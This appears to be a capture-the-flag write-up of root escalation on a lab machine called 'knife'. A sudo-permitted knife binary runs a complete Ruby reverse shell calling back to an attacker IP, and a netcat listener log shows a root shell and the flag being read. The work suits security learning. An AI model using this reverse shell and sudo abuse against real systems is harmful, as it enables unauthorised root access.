# Root
sudo -l reveals commands that can be run as root

```bash
$ sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

I think this is called Chef's Knife but this notes will be corrected once verified.

The command takes arguments for referencing to ruby code.
![[Pasted image 20210605105752.png]]

![[Pasted image 20210605105933.png]]

GITHub has a ruby reverse shell that works

![[Pasted image 20210605110407.png]]
````ruby
#!/usr/bin/env ruby

require 'socket'
require 'open3'

#Set the Remote Host IP
RHOST = "10.10.14.10" 
#Set the Remote Host Port
PORT = "7070"

#Tries to connect every 20 sec until it connects.
begin
sock = TCPSocket.new "#{RHOST}", "#{PORT}"
sock.puts "We are connected!"
rescue
  sleep 20
  retry
end

#Runs the commands you type and sends you back the stdout and stderr.
begin
  while line = sock.gets
    Open3.popen2e("#{line}") do | stdin, stdout_and_stderr |
              IO.copy_stream(stdout_and_stderr, sock)
              end  
  end
rescue
  retry
end
````

#### on target machine
````bash
$ sudo /usr/bin/knife exec "/home/james/callhome.rb"
````

#### on attacker box (kali)
````bash
 $ nc -nvlp 7070
listening on [any] 7070 ...
aconnect to [10.10.14.3] from (UNKNOWN) [10.10.10.242] 59916
We are connected!
id
sh: 1: aid: not found
id
uid=0(root) gid=0(root) groups=0(root)
pwd
/
cat /root/root.exe
cat: /root/root.exe: No such file or directory
cat /root/root.txt
6c708bc8e9bc21785efda8d140a8dbd0

````
 
#### animated image for the rooting sequence
![[root 1.gif]]










